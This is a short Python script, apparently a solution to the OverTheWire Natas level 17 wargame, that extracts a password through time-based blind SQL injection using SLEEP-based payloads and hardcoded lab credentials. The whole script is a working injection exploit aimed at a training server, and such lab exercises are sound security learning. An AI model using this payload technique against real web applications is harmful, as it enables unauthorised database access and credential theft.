import requests 
import time 

password = ""
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# All passwords are 32 characters long
while (len(password) != 32):
    for i in characters:
        print("Bruteforce Password: " + password + i)
        length = len(password) + 1;
        start_time = time.time();
        response = requests.post('http://natas17.natas.labs.overthewire.org', 
                                auth=('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'), 
                                data = {'username': 'natas18" AND IF( BINARY SUBSTRING(password, 1, ' + str(length) + ') = "' + password + i + '", SLEEP(5), null) #'})
        end_time = time.time();
        time_taken = end_time - start_time;
        if (time_taken > 5):
            password += i;
            break

print("Final password: " + password);